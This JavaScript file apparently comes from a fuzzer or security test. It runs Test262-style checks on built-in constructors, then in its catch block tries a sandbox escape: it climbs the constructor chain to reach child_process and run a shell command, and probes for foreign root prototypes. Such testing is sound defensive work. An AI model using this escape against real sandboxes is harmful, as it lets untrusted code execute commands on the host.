try {
    function test() {
        if (Object === null) {
            $ERROR('#13: Object === null');
        }
        if (Function === null) {
            $ERROR('#14: Function === null');
        }
        if (String === null) {
            $ERROR('#15: String === null');
        }
        if (Number === null) {
            $ERROR('#16: Function === null');
        }
        if (Array === null) {
            $ERROR('#17: Array === null');
        }
        if (Boolean === null) {
            $ERROR('#20: Boolean === null');
        }
        if (Date === null) {
            $ERROR('#18: Date === null');
        }
        if (RegExp === null) {
            $ERROR('#19: RegExp === null');
        }
        if (Error === null) {
            $ERROR('#20: Error === null');
        }
        if (EvalError === null) {
            $ERROR('#21: EvalError === null');
        }
        if (RangeError === null) {
            $ERROR('#22: RangeError === null');
        }
        if (ReferenceError === null) {
            $ERROR('#23: ReferenceError === null');
        }
        if (SyntaxError === null) {
            $ERROR('#24: SyntaxError === null');
        }
        if (TypeError === null) {
            $ERROR('#25: TypeError === null');
        }
        if (URIError === null) {
            $ERROR('#26: URIError === null');
        }
    }
    test();
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}